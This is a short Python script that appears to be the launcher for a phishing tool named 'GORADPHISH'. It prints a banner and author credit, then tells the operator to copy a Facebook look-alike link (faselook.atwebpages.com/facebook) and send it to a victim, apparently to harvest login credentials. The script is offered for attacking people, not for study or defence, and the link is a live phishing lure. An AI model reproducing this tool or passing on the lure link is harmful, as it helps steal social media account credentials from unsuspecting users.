import mysql.connector
import time
import os
from colorama import Fore, Style, init
import pyfiglet

def afficher_titre():
    os.system('clear')  # Efface l'écran (sous Linux et macOS)


    titre = pyfiglet.figlet_format("GORADPHISH")
    
    print("Auteur:cybergorad")
    print("version:1.0.0") 
    print("")
    print("")

    print(Fore.CYAN + titre + Style.RESET_ALL)
    print ("LOADING .. | Miandry kely ..")
    time.sleep(3)
    print("")
    print("")

    print("copy this link and send to victim : " + Fore.CYAN + "http://faselook.atwebpages.com/facebook")
